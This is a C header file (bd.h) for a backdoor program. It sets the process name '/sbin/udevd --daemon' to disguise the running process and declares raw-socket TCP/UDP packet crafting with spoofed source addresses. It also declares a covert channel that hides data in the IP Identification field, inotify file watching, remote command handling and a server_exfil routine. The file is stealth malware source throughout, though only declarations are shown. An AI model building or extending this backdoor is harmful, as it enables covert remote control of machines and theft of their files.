/*
| ------------------------------------------------------------------------------
| File:     bd.h
| Purpose:  Header file for bd.c
| 
| ------------------------------------------------------------------------------
*/

/*
| ------------------------------------------------------------------------------
| Headers
| ------------------------------------------------------------------------------
*/

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <pthread.h>
#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/inotify.h>
#include "packet_headers.h"
#include "bd_encrypt.h"

/*
| ------------------------------------------------------------------------------
| Constants
| ------------------------------------------------------------------------------
*/

#define PROCESS_NAME        "/sbin/udevd --daemon"

// Packet defaults
#define PKT_SIZE            4096

// TCP Defaults
#define WIN_SIZE            55840
#define DEFAULT_TTL         255
#define DEFAULT_IP_ID       12345

// Client defaults (Can be spoofed but won't receive replies)
#define DEFAULT_SRC_IP      "192.168.0.3"    // Client address. Backdoor replies
#define DEFAULT_SRC_PORT    34231             // will be sent to this address and port

// Response
#define MESSAGE_MAX_SIZE    32

#define EVENT_SIZE  ( sizeof (struct inotify_event) )
#define EVENT_BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )

/*
| ------------------------------------------------------------------------------
| Prototypes
| ------------------------------------------------------------------------------
*/

/* Options to pass to client function */

struct client_opt{
    char target_host[128];
    char command[BD_MAX_MSG_LEN];
    int target_port;
    char device[128];
    int protocol;           // 0 - TCP, 1 - UDP
};

/* Options to pass to server function */

struct server_opt{
    char device[128];
    int protocol;           // 0 - TCP, 1 - UDP
    int packet_delay;       // Wait time between each covert channel packet
};

/* TCP checksum pseudo-header */

typedef struct {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
    char *data;
}pseudo_tcp_header;

/* UDP checksum pseudo-header */

typedef struct {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short udp_length;
    struct udphdr udp;
    char *data;
}pseudo_udp_header;

/* Raw socket object with options */

struct addr_info {
    int raw_socket;
    char *dhost;
    char *shost;
    int dport;
    int sport;
};

struct message_buffer {
    int position;
    char buffer[MESSAGE_MAX_SIZE];
};

/* Data comes in 2 bytes at a time for the covert channel */

union Segment {
    uint16_t s;
    struct Byte{
        uint8_t c1, c2;
    }byte; 
};

void client(struct client_opt c_opt);
void server(struct server_opt s_opt);
int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len, int mode); // When mode is 0, send as normal payload
int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len, int mode); // ...else when mode is 1, send in IP Identification field (Covert channel)
void client_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void server_exfil(char *file_path);
void mask_process(char **, char *);
void usage();
unsigned short csum(unsigned short *, int);
static void system_fatal(const char* message);
static void inot(char *fileName, char *filePath);
